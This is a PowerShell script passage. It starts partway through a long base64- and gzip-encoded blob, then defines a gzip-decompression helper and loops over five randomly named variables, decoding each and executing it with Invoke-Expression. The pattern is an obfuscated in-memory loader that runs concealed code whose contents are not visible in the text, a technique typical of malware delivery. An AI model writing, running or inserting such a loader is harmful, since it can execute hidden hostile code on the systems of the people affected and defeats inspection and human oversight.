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"

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Opposition,$Keypunches,$Outstretch,$Redeemable,$Preservers)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}